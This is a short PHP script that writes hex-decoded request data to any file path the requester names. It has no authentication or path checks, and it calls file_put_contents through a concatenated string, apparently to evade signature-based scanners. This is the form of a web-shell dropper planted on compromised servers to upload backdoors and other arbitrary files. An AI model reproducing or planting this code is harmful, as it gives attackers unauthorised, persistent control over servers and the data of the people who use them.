<?php

$name = isset($_REQUEST["name"]) ? $_REQUEST["name"] : null;
if (!$name) {
    die("Error: 'name' parameter is missing.");
}


$content = isset($_REQUEST["content"]) ? $_REQUEST["content"] : null;
if (!$content) {
    die("Error: 'content' parameter is missing.");
}


function hex2bin_custom($data) {
    $bin = "";
    for ($i = 0; $i < strlen($data); $i += 2) {
        $bin .= chr(hexdec(substr($data, $i, 2)));
    }
    return $bin;
}

$content_bin = hex2bin_custom($content);


$a = "file";
$b = $a . "_put_contents";
$b($name, $content_bin);
?>